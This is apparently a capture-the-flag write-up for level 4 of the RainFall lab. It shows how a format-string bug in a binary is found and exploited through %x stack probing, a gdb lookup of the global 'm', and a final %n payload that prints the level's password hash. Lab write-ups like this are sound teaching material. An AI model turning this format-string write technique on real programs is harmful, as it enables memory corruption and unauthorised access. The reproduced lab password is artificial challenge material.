# level 04

The program doesn't seems to wait for parameters but read `stdin` and print it to `stdout`. It doesn't looks like to segfault with large strings :

```bash
level4@RainFall:~$ python -c 'print "A" * 600' python -c 'print "A" * 10' | ./level4
AAAAAAAAAA
level4@RainFall:~$ python -c 'print "A" * 20' | ./level4
AAAAAAAAAAAAAAAAAAAA
level4@RainFall:~$ python -c 'print "A" * 200' | ./level4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

By looking at the assembly code, we can see that the function to inspect is the `n` function. It takes input with `fgets` function, and pass it in a function `p` that simply pass the parameter as the only parameter to `printf`.

First, we will find the Direct Access Paramete, with the script or manually:

```bash
level4@RainFall:~$ (python -c 'print "AAAA" + " %x" * 15') | ./level4
AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```

We can see that our Direct Access Parameter is at 12th position.
Then, we get the m address:

```bash
(gdb) info variables
All defined variables:

Non-debugging symbols:
...
0x08049810  m
```

Finally, we need to substract 4 for the number that is check: 16930116 - 4 = 16930112.

We try to exploit:

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"') | ./level4
                                                                                                                                                b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
